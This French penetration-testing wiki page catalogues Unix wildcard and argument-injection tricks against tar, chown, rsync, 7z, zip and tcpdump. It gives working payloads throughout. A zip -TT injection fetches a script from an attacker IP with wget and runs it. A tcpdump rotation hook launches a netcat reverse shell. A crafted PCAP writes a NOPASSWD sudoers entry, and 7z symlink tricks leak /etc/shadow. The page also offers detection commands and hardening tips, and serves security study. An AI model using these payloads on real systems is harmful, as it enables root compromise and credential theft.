# Astuces supplémentaires sur les wildcards

{{#include ../../banners/hacktricks-training.md}}

> L’**argument injection** par wildcard (alias *glob*) se produit lorsqu’un script privilégié exécute un binaire Unix tel que `tar`, `chown`, `rsync`, `zip`, `7z`, … avec un wildcard non protégé par des guillemets, comme `*`.  
> Comme le shell développe le wildcard **avant** d’exécuter le binaire, un attaquant capable de créer des fichiers dans le répertoire de travail peut fabriquer des noms de fichiers commençant par `-` afin qu’ils soient interprétés comme des **options plutôt que comme des données**, ce qui permet d’injecter des flags arbitraires, voire des commandes.<sup>[[6]](#references)</sup>
> Cette page rassemble les primitives les plus utiles, les recherches récentes et les détections modernes pour 2023-2025.

## chown / chmod

Vous pouvez **copier le propriétaire/groupe ou les bits de permission d’un fichier de référence** en abusant du flag `--reference` lorsqu’un nom de fichier ressemblant à une option est développé par un wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Lorsque root exécute ensuite quelque chose comme :

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

L’option développée `--reference=.drf.php` remplace le propriétaire et le mode explicitement définis, ce qui fait hériter aux fichiers correspondants les métadonnées de `.drf.php` (et, avec la configuration ci-dessus, les rend modifiables par l’attaquant).<sup>[[6]](#references)</sup>

Examinez l’intégralité du helper privilégié, pas seulement sa ligne `chown`. Un changement de propriétaire peut effacer les bits set-user-ID ou set-group-ID ; [POSIX laisse le cas privilégié défini par l’implémentation](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Un `chmod` ultérieur dans la même tâche peut rétablir ces bits sur les fichiers sélectionnés précédemment, modifiant ainsi le résultat. Vérifiez l’ordre réel des commandes, le répertoire du glob modifiable, le comportement vis-à-vis des fichiers et des liens concernés, le propriétaire et le mode obtenus, ainsi que la prise en charge de set-user-ID par le système de fichiers, avant de considérer qu’il s’agit d’une voie d’élévation de privilèges via un exécutable. Un helper illisible ne permet pas de vérifier ces étapes.

*PoC et outil* : [`wildpwn`](https://github.com/localh0t/wildpwn) (attaque combinée).<sup>[[7]](#references)</sup>
Consultez également le document classique de DefenseCode pour plus de détails.<sup>[[6]](#references)</sup>

---

## GNU `cp` dans un script privilégié

Examinez un script exécuté en tant que root qui copie depuis le répertoire de travail choisi par son appelant à l’aide d’un glob simple, par exemple `cp .version * /etc/app/staged/`, lorsqu’un utilisateur de moindre privilège peut y créer des noms de fichiers. GNU `cp` peut interpréter comme une option un nom de fichier commençant par un tiret et développé à partir de `*`. Son option `--preserve=mode` peut conserver les bits de mode source dans une nouvelle copie, et `--target-directory` peut modifier la destination de la copie. Pour vérifier l’un ou l’autre effet, il faut examiner la branche exacte du script, l’état de la destination, les privilèges effectifs, la politique du système de fichiers et le comportement de GNU `cp` ; le texte d’une règle sudo ou d’un script ne suffit pas à prouver une élévation de privilèges. Préfixer les opérandes par `./` ou terminer l’analyse des options avec `--` empêche cette interprétation des noms commençant par un tiret dans GNU `cp` ([FAQ GNU Coreutils](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [manuel de `cp`](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Exécutez des commandes arbitraires en détournant la fonctionnalité **checkpoint** de GNU tar et ses actions de checkpoint.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Une fois que root exécute par exemple `tar -czf /root/backup.tgz *`, `shell.sh` est exécuté en tant que root.<sup>[[10]](#references)</sup>

### bsdtar / mise en garde concernant le remplacement du compresseur sur macOS

Le `tar` par défaut des versions récentes de macOS (basé sur `libarchive`) ne fournit *pas* l’interface `--checkpoint` de GNU tar, mais bsdtar documente **--use-compress-program** pour sélectionner un compresseur externe.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Lorsqu’un script privilégié exécute `tar -cf backup.tar *`, cela sélectionne `sh` via le `PATH` de la victime et bsdtar le lance comme compresseur.<sup>[[11]](#references)</sup> Cela prouve qu’il y a injection d’options, mais ne constitue pas, à lui seul, un moyen fiable d’exécuter des commandes arbitraires : un nom de fichier créé par un caractère générique ne peut pas contenir `/`, et bsdtar fournit des données d’archive plutôt qu’une commande shell choisie par l’attaquant. L’exécution de code nécessite également un exécutable contrôlable résolu via `PATH` ou un autre canal d’arguments permettant de désigner un programme utile.

---

## rsync

`rsync` permet de remplacer le shell distant ou le binaire distant à l’aide d’options de ligne de commande telles que `-e` et `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Si root archive ensuite le répertoire avec `rsync -az * backup:/srv/`, le flag injecté peut lancer un shell via le mécanisme de shell distant.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC* : [`wildpwn`](https://github.com/localh0t/wildpwn) (mode `rsync`).

---

## 7-Zip / 7z / 7za

Même si le script privilégié préfixe *par précaution* le caractère générique avec `--` (pour empêcher l’analyse des options), le CLI 7-Zip accepte les **fichiers de liste de fichiers** en préfixant le nom de fichier avec `@`. En combinant cela avec un symlink, vous pouvez *exfiltrer des fichiers arbitraires*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Si root exécute quelque chose comme :

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip tentera de lire `root.txt` (→ `/etc/shadow`) comme une liste de fichiers et abandonnera, **en affichant le contenu sur stderr**.<sup>[[13]](#references)</sup>

Cela fonctionne aussi avec `-- *`, car la CLI de 7-Zip accepte explicitement les noms de fichiers classiques et les `@listfiles` comme arguments positionnels. Ainsi, un nom de fichier littéral tel que `@root.txt` est toujours traité de manière spéciale.<sup>[[13]](#references)</sup>

---

## zip

Deux primitives très pratiques existent lorsqu’une application transmet à `zip` des noms de fichiers contrôlés par l’utilisateur (via un wildcard ou en énumérant les noms sans `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via un hook de test : `-T` active le « test archive » et `-TT <cmd>` remplace le programme de test par un programme arbitraire (forme longue : `--unzip-command <cmd>`). Si vous pouvez injecter des noms de fichiers commençant par `-`, répartissez les flags entre plusieurs noms distincts afin que le parsing des options courtes fonctionne.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Notes
- N’essayez PAS un nom de fichier unique comme `'-T -TT <cmd>'` — les options courtes sont analysées caractère par caractère et cela échouera. Utilisez des jetons séparés, comme indiqué.<sup>[[3]](#references)</sup>
- Si l’application supprime les barres obliques des noms de fichiers, récupérez le contenu depuis un hôte/IP nu (chemin par défaut `/index.html`) et enregistrez-le localement avec `-O`, puis exécutez-le.<sup>[[3]](#references)</sup>
- Vous pouvez déboguer l’analyse avec `-sc` (affiche les argv traités) ou `-h2` (aide plus détaillée) pour comprendre comment vos jetons sont interprétés.<sup>[[3]](#references)</sup>

Exemple (comportement local avec zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Exfiltration/fuite de données (leak) : si la couche web renvoie stdout/stderr de `zip` (cas courant avec des wrappers naïfs), des flags injectés comme `--help` ou les erreurs dues à des options incorrectes apparaîtront dans la réponse HTTP, confirmant l’injection de ligne de commande et facilitant l’ajustement du payload.<sup>[[3]](#references)</sup>

---

## Autres candidats à l’injection d’options

Lorsqu’un wrapper privilégié développe un répertoire accessible en écriture à l’aide d’un wildcard, ces hooks d’options documentés méritent d’être vérifiés.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binaire | Flag à exploiter | Effet |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Transmet une chaîne de commande à un shell |
| `git`   | `-c core.sshCommand=<cmd>` | Utilise `<cmd>` à la place de SSH pour Git fetch/push |
| `scp`   | `-S <program>` | Utilise un autre programme de connexion compatible avec SSH |

Ces primitives sont utiles à vérifier en plus des classiques *tar/rsync/zip*.

---

## Recherche de wrappers et de tâches vulnérables

Des études de cas récentes et des recommandations de détection montrent que l’injection via wildcard/argv ne concerne plus uniquement le problème **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Cette même catégorie de bugs continue d’apparaître dans :

- les fonctionnalités web qui « téléchargent tout sous forme de zip/tar » depuis des répertoires d’upload contrôlés par un attaquant
- les shells de debug de fournisseurs ou d’appliances qui exposent un wrapper **tcpdump** avec des champs de nom de fichier/filtre contrôlés par un attaquant
- les tâches de sauvegarde ou de rotation qui exécutent `tar`, `rsync`, `7z`, `zip`, `chown` ou `chmod` sur des répertoires accessibles en écriture

Commandes de triage utiles (l’invocation de `pspy` utilise les flags documentés pour les événements de processus/fichiers et l’intervalle).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Heuristiques rapides :

- `-- *` est une bonne solution pour de nombreux outils GNU, mais **pas** pour `7z`/`7za`, car les `@listfiles` sont analysés séparément.<sup>[[13]](#references)</sup>
- Pour `zip`, cherchez les wrappers qui énumèrent directement des noms de fichiers contrôlés par l’utilisateur ; le découpage des options courtes (`-T` + `-TT <cmd>`) fonctionne toujours, même sans shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Pour `tcpdump`, prêtez une attention particulière aux wrappers qui vous laissent contrôler les **noms des fichiers de sortie**, les **paramètres de rotation** ou les arguments de **relecture des fichiers de capture**.<sup>[[18]](#references)</sup>

---

## Hooks de rotation tcpdump (-G/-W/-z) : RCE via injection dans argv au sein des wrappers

Lorsqu’un shell restreint ou un wrapper fournisseur construit une ligne de commande `tcpdump` en concaténant des champs contrôlés par l’utilisateur (par exemple, un paramètre « nom de fichier ») sans guillemets ni validation stricts, vous pouvez insérer des flags `tcpdump` supplémentaires. La combinaison de `-G` (rotation basée sur le temps), `-W` (limite le nombre de fichiers) et `-z <cmd>` (commande exécutée après la rotation) permet l’exécution de commandes arbitraires en tant qu’utilisateur exécutant tcpdump (souvent root sur les appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Conditions préalables :

- Vous pouvez influencer l’`argv` transmis à `tcpdump` (par exemple, via un wrapper comme `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Le wrapper ne nettoie pas les espaces ni les tokens commençant par `-` dans le champ du nom de fichier.<sup>[[4]](#references)</sup>

PoC classique (exécute un script de reverse shell depuis un chemin accessible en écriture).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Détails :

- `-G 1` effectue une rotation chaque seconde, et `-W 1` s’arrête après un fichier en rotation ; la capture doit recevoir un paquet correspondant avant la rotation.<sup>[[18]](#references)</sup>
- `-z <cmd>` exécute la commande post-rotation une fois par rotation et transmet le chemin du savefile fermé comme argument ; assurez-vous que la gestion des arguments du script/interpréteur correspond à votre payload.<sup>[[18]](#references)</sup>

Variantes sans support amovible :

- Si vous disposez d’un autre moyen d’écrire des fichiers (par exemple, un wrapper de commande distinct qui autorise la redirection de sortie), déposez votre script dans un chemin connu et déclenchez `-z /path/script.sh` ; si nécessaire, faites appeler `/bin/sh` par le script.<sup>[[18]](#references)</sup>
- Si un wrapper fournisseur vous permet de choisir le chemin du fichier en rotation, auditez ce contrôle du chemin uniquement avec une commande post-rotation qui interprète son argument savefile ; le contrôle du chemin à lui seul n’exécute pas le contenu du fichier.<sup>[[18]](#references)</sup>

---

## sudoers : tcpdump avec jokers/arguments supplémentaires → écriture/lecture arbitraires et root

Exemple d’anti-pattern sudoers :<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

La règle laisse plusieurs options disponibles selon l’analyseur documenté de `tcpdump` :<sup>[[3]](#references)[[18]](#references)</sup>
- Le glob `*` et les motifs permissifs ne contraignent que le premier argument de `-w`. `tcpdump` accepte plusieurs options `-w` ; la dernière l’emporte.<sup>[[3]](#references)[[18]](#references)</sup>
- La règle ne fixe pas les autres options ; `-Z`, `-r`, `-V`, etc. sont donc autorisées.<sup>[[3]](#references)[[18]](#references)</sup>

Les primitives pertinentes sont documentées ci-dessous.<sup>[[3]](#references)[[18]](#references)</sup>
- Remplacer le chemin de destination avec un second `-w` (le premier satisfait uniquement sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal à l’intérieur du premier `-w` pour sortir de l’arborescence restreinte.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Forcez le propriétaire des fichiers de sortie à `root` avec `-Z root` (crée des fichiers appartenant à root n’importe où).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Écriture de contenu arbitraire en rejouant un PCAP spécialement conçu avec `-r` (par exemple, pour ajouter une ligne à sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Créer un PCAP contenant la charge utile ASCII exacte et l’écrire en tant que root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Lecture arbitraire de fichiers/secret leak avec `-V <file>` (interprète une liste de fichiers de sauvegarde). Les diagnostics d’erreur réaffichent souvent des lignes, ce qui peut exposer du contenu.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump : injection d’arguments Zip vers RCE + élévation de privilèges via mauvaise configuration sudo de tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Chaîne d’exploitation complète](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Shell potentiel détecté via injection de caractères génériques](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Retour vers le futur : les caractères génériques Unix déchaînés (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils - invocation de `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils - invocation de `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Points de contrôle GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Manuel bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Manuel rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Syntaxe de la ligne de commande 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Manuel flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Documentation de configuration Git](https://git-scm.com/docs/git-config)
- [17] [Manuel OpenBSD `scp`](https://man.openbsd.org/scp)
- [18] [Manuel tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
